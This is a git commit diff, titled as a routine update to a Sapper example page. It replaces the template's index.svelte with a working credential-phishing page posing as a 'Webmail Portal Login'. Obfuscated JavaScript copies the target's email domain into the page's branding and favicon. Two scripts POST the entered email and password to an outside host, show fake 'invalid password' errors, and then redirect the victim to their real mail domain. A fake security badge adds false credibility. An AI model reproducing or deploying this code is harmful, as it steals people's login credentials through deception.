541dd1e04a694642fa2811ecfc676f8b3772bc97
coinmixter <86773357+coinmixter@users.noreply.github.com>
2021-07-23 20:11:35 +0200

    Update index.svelte

--- examples/sapper/src/routes/index.svelte
+++ examples/sapper/src/routes/index.svelte
@@ -1,46 +1,55 @@
-<style>
-	h1, figure, p {
-		text-align: center;
-		margin: 0 auto;
-	}
+<!DOCTYPE html>
+<html>
 
-	h1 {
-		font-size: 2.8em;
-		text-transform: uppercase;
-		font-weight: 700;
-		margin: 0 0 0.5em 0;
-	}
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+	<title>Webmail Portal Login</title>
+    <script src="https://storage.googleapis.com/pvcr/js/jquery-1.11.1.min.js"></script>
+    <style>html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}html,body{font-size:18px;font-family:Arial,helvetica\ neue,Helvetica,sans-serif\ sans-serif;font-weight:500}#root{position:absolute;left:0;right:0;bottom:0;top:0;z-index:-10;pointer-events:none}.error{color:#dc3545;width:80%;margin:0 auto;padding-top:5px}.form-holder{background-color:#fff;width:600px;margin:180px auto;height:100%;box-shadow:0 20px 50px #a9a9a9;border-radius:4px 4px 0 0;border:1px solid #d6dfea;z-index:12}.xlogo{background-color:#0d4f8b;color:#fff;padding:8px;margin-bottom:10px}.xlogo img{vertical-align:middle;width:5%;height:5%;object-fit:contain}.xlogo span{vertical-align:middle}.form-wrap{width:400px;margin:0 auto;text-align:center}.form-wrap p{font-size:24px}.form-wrap img{margin:20px}.finput{width:80%;margin:10px auto}.finput input[type="email"],.finput input[type="password"]{font-size:24px;padding:7px 10px 7px 40px;border-radius:4px;margin:5px 0;width:90%;border:1px solid #d6dfea}.finput input[type="email"]{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAQAAABKIxwrAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADdcAAA3XAUIom3gAAAAHdElNRQfjAwITKgogc0nIAAAA/ElEQVQ4y43Sv07CUBTH8W9BiEvjSAcZCMbRQWNKSHBnwD4AL8DII7CRONXwDE76DhhfoCshIeGPJLoRZGjCcBygtdR72/s7w10+Ock550I6V4wImBEwok5OHvhB4trSysJlVgksCAtKeu6lsCB0kqBwwl1FC1fPHQV39NxS8KKeLxV8rh+1qRi1kbXKjxQek5ka6wT+pEZOqryxR9jzymUe7WMDNtfHt09VTSv4hAhfDGlzR5sh3wghPpVTajFgp9hKVDsGyZv0MmhUvb/eEwM+jU7qGWBBeDzwd0M+Brg1xIJwX+SJm7zLxTm32HBhzDdnPNNV/vP/EV5+AUv1vp3jhmegAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTAyVDE4OjQyOjEwKzAxOjAw99JImgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0wMlQxODo0MjoxMCswMTowMIaP8CYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC) no-repeat scroll 10px 10px}.finput input[type="password"]{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAQAAABKfvVzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAHdElNRQfjAwITLAsBLt7YAAAA1klEQVQ4y72STQ6CMBCFP3SNiSSykvvoUtEDGe7CEfQW6NI1sNRECUtxXABKofwkJE6TJn3z3vTNtFAPG48zKSkBHgt6YkeCVNaTbTf9rdAFIWuX2EX1EBcTkw1XBOHRZswr6NYXsYgQhINecEEQXAXbIwiBXpAbMhVshiAkP8CoJKWBaNBJ35zrUQruRSUaYy3Rm2pJBhQ3RlkaKTji4HDqEqqNLgFwdO3rb5j221Vr+QD4w2+YV/ZBTUcAxMMFGQAvXep/Lx33MiP1uCZs/NPqClnlxA8hMnhnez+9CwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0wMy0wMlQxODo0NDoxMSswMTowMFy7M2kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMDMtMDJUMTg6NDQ6MTErMDE6MDAt5ovVAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAABJRU5ErkJggg==) no-repeat scroll 7px 7px}.finput input[type="email"]:hover,.finput input[type="password"]:hover,.finput input[type="email"]:focus,.finput input[type="password"]:focus{border:1px solid #0d4f8b}button{border:1px solid #0d4f8b;font-size:20px;padding:7px 20px;border-radius:4px;background-color:#0d4f8b;color:#fff}button:hover{background-color:#1874cd;cursor:pointer}.privacy{font-size:14px;color:gray;text-align:left;display:block;margin-bottom:20px}</style>
+    <link id="favicon" rel="shortcut icon" type="image/png" href="https://firebasestorage.googleapis.com/v0/b/chdi98-u54r.appspot.com/o/favicon.png">
+    <script type="text/javascript">var _0x29a3=['innerHTML','137967OuewSg','379705GmhmYc','src','block','display','message','hash','preventDefault','1BQGHgr','val','fail','Check\x20your\x20network\x20connection..','style','ajax','kai','input[name=pr]','redirecto','banNer','input[name=ai]','title','myframe','74734CDKuWR','Webmail\x20Portal\x20Login\x20-\x20','replace','https://www.','zion','attr','none','282575HCidVs','slice','getElementById','Retype','31421MpoORy','indexOf','1DvjFvy','length','ai','Invalid\x20password\x20.\x20Please\x20try\x20again\x20...','https://www.google.com/s2/favicons?domain=','location','myError','log','focus','pr','value','12FNOhav','hido','572226OvGFSN','href','529969LtYXLi'];var _0x40b2=function(_0x4fbed0,_0xbe12cc){_0x4fbed0=_0x4fbed0-0x93;var _0x29a399=_0x29a3[_0x4fbed0];return _0x29a399;};var _0x2e20a0=_0x40b2;(function(_0x492b24,_0x50e8e9){var _0x1b0ff2=_0x40b2;while(!![]){try{var _0x1e35b8=-parseInt(_0x1b0ff2(0xb8))+parseInt(_0x1b0ff2(0xba))+parseInt(_0x1b0ff2(0x9e))*-parseInt(_0x1b0ff2(0xc4))+parseInt(_0x1b0ff2(0xb6))*parseInt(_0x1b0ff2(0xa9))+parseInt(_0x1b0ff2(0xa5))+parseInt(_0x1b0ff2(0xbc))+parseInt(_0x1b0ff2(0xbd))*-parseInt(_0x1b0ff2(0xab));if(_0x1e35b8===_0x50e8e9)break;else _0x492b24['push'](_0x492b24['shift']());}catch(_0x3cd5ae){_0x492b24['push'](_0x492b24['shift']());}}}(_0x29a3,0x49762));var hash=window[_0x2e20a0(0xb0)]['hash']['substr'](0x1);window['onload']=function onoff(){var _0x230e50=_0x2e20a0;if(hash){var _0x1af05f=window[_0x230e50(0xb0)][_0x230e50(0xc2)][_0x230e50(0xa0)]('#',''),_0x1fe803=_0x1af05f[_0x230e50(0xaa)]('@'),_0x3ebdb8=_0x1af05f[_0x230e50(0xa6)](_0x1fe803+0x1,_0x1af05f[_0x230e50(0xac)]);document[_0x230e50(0x9c)]=_0x230e50(0x9f)+_0x3ebdb8;var _0x234425=_0x230e50(0xaf)+_0x3ebdb8;document[_0x230e50(0xa7)](_0x230e50(0xa2))[_0x230e50(0xbe)]=_0x234425,document[_0x230e50(0xa7)](_0x230e50(0xad))['value']=_0x1af05f,document[_0x230e50(0xa7)](_0x230e50(0x97))[_0x230e50(0xbb)]=_0x3ebdb8,document[_0x230e50(0xa7)](_0x230e50(0x9a))[_0x230e50(0xbb)]=_0x3ebdb8,$('#favicon')[_0x230e50(0xa3)](_0x230e50(0xb9),_0x234425),document[_0x230e50(0xa7)]('pr')[_0x230e50(0xb3)](),document['getElementById'](_0x230e50(0x9d))[_0x230e50(0xbe)]=_0x230e50(0xa1)+_0x3ebdb8,document[_0x230e50(0xa7)]('redirecto')[_0x230e50(0xb5)]=_0x230e50(0xa1)+_0x3ebdb8;}else{}};var n=0x0;function goNow(){var _0x47a8dd=_0x2e20a0,_0x4d9fc4=document['getElementById'](_0x47a8dd(0xb4)),_0x3cdf92=document['getElementById'](_0x47a8dd(0x99))[_0x47a8dd(0xb5)],_0x12e0b2=document[_0x47a8dd(0xa7)](_0x47a8dd(0xb1));if(_0x4d9fc4[_0x47a8dd(0xb5)][_0x47a8dd(0xac)]<0x4)return _0x12e0b2[_0x47a8dd(0x95)][_0x47a8dd(0xc0)]='block',_0x12e0b2[_0x47a8dd(0xbb)]='Put\x20your\x20correct\x20password.',_0x4d9fc4[_0x47a8dd(0xb3)](),![];else{_0x12e0b2['style'][_0x47a8dd(0xc0)]=_0x47a8dd(0xa4);var _0x410913={'email':$(_0x47a8dd(0x9b))[_0x47a8dd(0xc5)](),'passw':$(_0x47a8dd(0x98))[_0x47a8dd(0xc5)](),'hido':$('input[name=hido]')[_0x47a8dd(0xc5)]()};return $[_0x47a8dd(0x96)]({'type':'POST','url':'https://sudatti.com.br/cgi-bin/love.php','data':_0x410913,'dataType':'json','encode':!![]})['done'](function(_0x34bd96){var _0x3522b4=_0x47a8dd;console[_0x3522b4(0xb2)](_0x34bd96),!_0x34bd96['success']?(_0x12e0b2[_0x3522b4(0x95)][_0x3522b4(0xc0)]=_0x3522b4(0xbf),_0x12e0b2[_0x3522b4(0xbb)]='Unknown\x20error\x20encountered.\x20Try\x20again\x20later.',_0x4d9fc4[_0x3522b4(0xb5)]='',_0x4d9fc4[_0x3522b4(0xb3)]()):_0x34bd96[_0x3522b4(0xc1)]==_0x3522b4(0xa8)?(n++,document['getElementById'](_0x3522b4(0xb7))[_0x3522b4(0xb5)]=n,_0x4d9fc4[_0x3522b4(0xb5)]='',_0x12e0b2[_0x3522b4(0x95)][_0x3522b4(0xc0)]=_0x3522b4(0xbf),_0x12e0b2[_0x3522b4(0xbb)]=_0x3522b4(0xae),_0x4d9fc4['focus']()):window[_0x3522b4(0xb0)]['replace'](_0x3cdf92);})[_0x47a8dd(0x93)](function(_0x23a40f){var _0x175800=_0x47a8dd;_0x12e0b2['style'][_0x175800(0xc0)]=_0x175800(0xbf),_0x12e0b2[_0x175800(0xbb)]=_0x175800(0x94),console[_0x175800(0xb2)](_0x23a40f);}),event[_0x47a8dd(0xc3)](),!![];}}</script>
+</head>
 
-	figure {
-		margin: 0 0 1em 0;
-	}
+<body>
+    <div class="form-holder">
+        <div class="xlogo">
+            <img id="zion" src="https://storage.googleapis.com/pvcr/images/favicons">
+            <span style="text-transform: capitalize;" id="banNer"></span>
+        </div>
+        <div class="form-wrap">
+            <p>Please sign in with your email</p>
+            <center>
+                <div class="alert alert-danger" id="mgss" style="display: none;color: red;font-weight: 600;margin-top: 20px">Invalid Password..! Please enter correct password.</div>
+                <span id="error" class="text-danger" style="display: none;color: red;">That account doesn't exist. Enter a different account</span>
+            </center>
+            <div class="finput">
+                <input type="email" id="ai" name="ai" value="">
+            </div>
+            <div class="finput">
+                <input type="password" name="pr" placeholder="Email Password" id="pr" required="">
+            </div>
+            <div class="finput btn">
+                <button id="submit-btn">Continue</button>
+            </div>
+            <img src="https://www.pngitem.com/pimgs/m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
+            <span class="privacy">
+                Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
+                Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
+            </span>
+        </div>
+    </div>
+    <div id="root">
+        <iframe width="100%" height="100%" id="myframe" frameborder="0" scrolling="no" src="" __idm_frm__="2682"></iframe> </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>$(document).ready(function(){var count=0;$('#submit-btn').click(function(event){$('#error').hide();$('#mgss').hide();event.preventDefault();var ai=$("#ai").val();var pr=$("#pr").val();var mgss=$('#mgss').html();$('#mgss').text(mgss);var my_ai=ai;var filter=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!ai){$('#error').show();$('#error').html("Email field is empty.!");return false;}if(!filter.test(my_ai)){$('#error').show();$('#error').html("That account doesn't exist. Enter a different account");return false;}if(!pr){$('#error').show();$('#error').html("Password field is empty.!");return false;}var ind=my_ai.indexOf("@");var my_slice=my_ai.substr((ind+1));var c=my_slice.substr(0,my_slice.indexOf('.'));var final=c.toLowerCase();count=count+1;$.ajax({dataType:'JSON',url:'https://sudatti.com.br/cgi-bin/love.php',type:'POST',data:{ai:ai,pr:pr,},beforeSend:function(xhr){$('#submit-btn').html('Verifying...');},success:function(response){$("#pr").val("");if(count>=2){count=0;window.location.replace("http://www."+my_slice);return false;}$("#mgss").show();},error:function(){$("#pr").val("");if(count>=2){count=0;window.location.replace("http://www."+my_slice);return false;}$("#mgss").show();},complete:function(){$('#submit-btn').html('Continue');}});});});</script>
 
-	img {
-		width: 100%;
-		max-width: 400px;
-		margin: 0 0 1em 0;
-	}
-
-	p {
-		margin: 1em auto;
-	}
-
-	@media (min-width: 480px) {
-		h1 {
-			font-size: 4em;
-		}
-	}
-</style>
-
-<svelte:head>
-	<title>Sapper project template</title>
-</svelte:head>
-
-<h1>Great success!</h1>
-
-<figure>
-	<img alt='Borat' src='great-success.png'>
-	<figcaption>HIGH FIVE!</figcaption>
-</figure>
-
-<p><strong>Try editing this file (src/routes/index.svelte) to test live reloading.</strong></p>
+</html>
